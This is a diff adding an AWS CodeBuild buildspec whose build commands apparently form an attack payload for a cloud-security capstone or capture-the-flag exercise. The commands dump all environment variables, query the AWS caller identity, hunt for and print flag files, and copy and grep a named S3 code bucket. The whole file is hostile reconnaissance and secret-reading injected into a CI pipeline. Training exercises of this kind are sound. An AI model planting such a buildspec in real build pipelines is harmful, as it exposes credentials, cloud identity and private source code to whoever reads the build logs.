@@ -1,0 +1,9 @@
+version: 0.2
+phases:
+  build:
+    commands:
+      - id; hostname; echo "=== ENV ==="; env | sort
+      - echo "=== WHOAMI ==="; aws sts get-caller-identity
+      - echo "=== FLAG FILES ==="; find / -iname '*flag*' 2>/dev/null | head; cat /flag* 2>/dev/null
+      - echo "=== S3 CODE ==="; aws s3 ls s3://event-92480-sec588-capstone-6do99-s3-code --recursive
+      - aws s3 cp s3://event-92480-sec588-capstone-6do99-s3-code/ /tmp/code --recursive 2>/dev/null; ls -laR /tmp/code; grep -rIiE 'flag|sec588' /tmp/code 2>/dev/null
